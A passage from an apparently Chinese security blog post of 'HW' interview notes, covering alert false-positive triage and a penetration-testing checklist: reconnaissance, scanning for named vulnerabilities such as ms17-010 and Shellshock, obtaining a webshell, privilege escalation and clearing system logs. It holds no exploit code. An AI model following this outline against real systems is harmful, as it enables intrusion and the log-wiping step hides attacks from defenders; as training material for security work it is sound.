<li>重要信息节点：email，exchange，office 365，DC2012R2，DC2008 R2</li>
<li>web 中间件：IIS/apache/tomcat/weblogic/jboss/websphere/Nginx/FastCGI/PHPCGI/haproxy</li>
</ul>
<h2 id="二、有什么办法判断误报？"><a href="#二、有什么办法判断误报？" class="headerlink" title="二、有什么办法判断误报？"></a>二、有什么办法判断误报？</h2><p>时间线拉长，看看类似的请求或者数据包在之前很长一段时间有无出现。如果不是特别有规律的参数，如 md5 这类，一般是业务误报。如果是一些类似于文件操作或者命令执行的参数，很有可能就是攻击数据包。实在不确定就去问客户。</p>
<p>处置单大致分为 4 类，</p>
<p>1、业务系统之间的调用请求，设备报警，内网渗透向；</p>
<p>2、业务公司人员上生产系统上的 poc 测试（直接执行注入和远程读取命令），被系统误报成渗透攻击（这一条应该不算是误报，毕竟有攻击行为，只不过是自己人干的）；</p>
<p>3、centos 系统自动更新系统文件，设备报警，未经授权的访问外网；</p>
<p>4、业务人员配置中间件，设备报警；</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802200822073.png" alt="image-20230802200822073"></p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802200846847.png" alt="image-20230802200846847"></p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802200905258.png" alt="image-20230802200905258"></p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802200919990.png" alt="image-20230802200919990"></p>
<h2 id="二、拿到一个待检测的站"><a href="#二、拿到一个待检测的站" class="headerlink" title="二、拿到一个待检测的站"></a>二、拿到一个待检测的站</h2><p><strong>一、信息收集</strong></p>
<p>1.获取域名的 whois 信息,获取注册者邮箱姓名电话等。</p>
<p>2.通过站长之家、明小子、k8、站长之家等查询服务器旁站以及子域名站点，因为主站一般</p>
<p>比较难，所以先看看旁站有没有通用性的 cms 或者其他漏洞。</p>
<p>3、通过 DNS 域传送漏洞、备份号查询、SSl 证书、APP、微信公众号、暴力破解、DNS</p>
<p>历史记录、K8 C 段查询、Jsfinder、360 或华为威胁情报、证书序列号获取企业二级域名与 ip。</p>
<p>4、通过 Nmap、Wappalyzer、御剑等查看服务器操作系统版本，web 中间件，看看是否存</p>
<p>在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞</p>
<p>5.通过 7KB、破壳扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如</p>
<p>php 探针（phpinfo.php）、管理员备份文件。</p>
<p>6.google hack 进一步探测网站的信息，后台，敏感文件</p>
<p>7、敏感信息收集，如 github 源码、用 7kb、破壳扫源代码泄露（.hg、.git、cvs、svn、.DS_store</p>
<p>源代码泄露）、google hack、接口信息泄露、社工信息泄露、邮箱地址信息收集、网盘搜索、钟</p>
<p>馗之眼、天眼查、威胁情报、微步在线等</p>
<p>8、通过 Wappalyzer、御剑工具对网站指纹识别（包括，cms，cdn，证书等），dns 记录</p>
<p><strong>二、漏洞扫描</strong></p>
<p>1)用 AWVS、APPSCAN、长亭科技的 Xray 等扫描器检测 Web 漏洞，如 XSS,XSRF,sql</p>
<p>注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命</p>
<p>令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
<p>2)用 namp、天镜、Nessus、极光等扫描系统 ip，对扫描出来的高危漏洞进行测试，如</p>
<p>ms08-067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝 2 代、cve-2017-7494</p>
<p>（samba）、cve-2014-6271(破壳)、php cgi 等相关漏洞验证。</p>
<p><strong>3****）漏洞利用</strong></p>
<p>利用以上的方式拿到 webshell，或者其他权限</p>
<p><strong>4****）权限提升</strong></p>
<p>提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞，</p>
<p>如 iis6,pr,巴西烤肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以</p>
<p>及 oracle 低权限提权</p>
<p><strong>5)</strong> <strong>日志清理</strong></p>
<p>操作系统、中间件、数据库等日志进行清除</p>
<p><strong>6****）总结报告及修复方案</strong></p>
<h2 id="二、敏感信息收集"><a href="#二、敏感信息收集" class="headerlink" title="二、敏感信息收集"></a>二、敏感信息收集</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802201138494.png" alt="image-20230802201138494"></p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802201156536.png" alt="image-20230802201156536"></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">DU-玉</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://POISON-Biao.github.io/du-yu/interview-4.html">https://POISON-Biao.github.io/du-yu/interview-4.html</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">DU-玉</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/HW%E9%9D%A2%E7%BB%8F/">
                                    <span class="chip bg-color">HW面经</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/wechat.jpg" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias%5Ccomment_bg.jpg") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    .v[data-class="v"] .vwrap .vheader .vinput {
      width: 32%;
      border-bottom: 1px dashed #dedede;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
let metaPlaceholder = {"nick":"DU-玉","mail":"3529735834@qq.com","link":"网址(https://)"} ;
//这里要换行
new Valine({
        el: '#vcomments',
        appId: 'GUjk2F8uhkyaiYmBg5BCIpJD-gzGzoHsz',
        appKey: 'fxAHSVGA5HymqjFMwQnJ75jS',
        notify: 'true' === 'true',
        verify: 'true' === 'true',
        visitor: 'true' === 'true',
        avatar: 'monsterid',
        pageSize: '10',
        lang: 'zh-CN',
        placeholder: '写下你的评论吧.....',
        meta: ["nick", "mail", "link"],
        recordIP: 'true' === 'true',
        enableQQ: 'monsterid',
        requiredFields: ["46606772953bed0812789d6dc955614e"],
        master: ["46606772953bed0812789d6dc955614e"],
        friends: ["", ""],
        tagMeta: ["博主", "小伙伴", "访客"],
        metaPlaceholder: metaPlaceholder,

    });

    document.body.addEventListener('click', function(e) {
        if (e.target.classList.contains('vsubmit')) {
            const email = document.querySelector('input[type=email]');
            const nick = document.querySelector('input[name=nick]');
            const reg = /^[A-Za-z0-9_-\u4e00-\u9fa5]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/;
            if (!email.value || !nick.value || !reg.test(email.value)) {
                const str = `<div class="valert txt-center"><div class="vtext">请填写正确的昵称和邮箱！</div></div>`;
                const vmark = document.querySelector('.vmark');
                vmark.innerHTML = str;
                vmark.style.display = 'block';

                e.stopPropagation();

                setTimeout(function() {
                    vmark.style.display = 'none';
                    vmark.innerHTML = '';
                }, 2500);
            }
        }
        }, true);
</script>



    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/du-yu/xctf.html">
                    <div class="card-image">
                        
                        <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/xctf.jpg" class="responsive-img" alt="XCTF">
                        
                        <span class="card-title">XCTF</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            pwn、web
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-30
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/XCTF/">
                        <span class="chip bg-color">XCTF</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/du-yu/interview-3.html">
                    <div class="card-image">
                        
                        <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731020619406.png" class="responsive-img" alt="彪的HW面经">
                        
                        <span class="card-title">彪的HW面经</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            彪的HW面经
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-26
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/HW/" class="post-category">
                                    HW
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/HW%E9%9D%A2%E7%BB%8F/">
                        <span class="chip bg-color">HW面经</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: DU-玉<br />'
            + '文章作者: DU-玉<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="tencent"
                   type="playlist"
                   id="1776127550"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2023</span>
            
            <span id="year">2023</span>
            <a href="/about" target="_blank">DU-玉</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">178.5k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2023";
                    var startMonth = "7";
                    var startDate = "4";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/POISON-Biao" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:3529735834@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3529735834" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3529735834" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.11/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?aaa6c944b0ed07922901d7fc571a171d";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
